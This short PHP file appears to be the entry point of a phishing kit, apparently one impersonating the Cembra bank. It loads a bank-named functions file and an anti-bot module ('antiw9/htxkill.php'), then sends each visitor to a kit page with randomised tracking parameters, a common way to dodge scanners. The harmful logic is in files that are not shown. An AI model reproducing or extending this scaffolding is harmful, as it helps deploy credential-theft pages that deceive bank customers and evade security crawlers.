<?php

include __DIR__ . "/web-tag/cembra/functions.php";
include __DIR__ . "/antiw9/htxkill.php";



$redirectURL = "web-tag/index.php?userID=" . urlencode($randString) . "&ue=" . urlencode($randStringC);

header("Location: $redirectURL");
exit(); 
?>
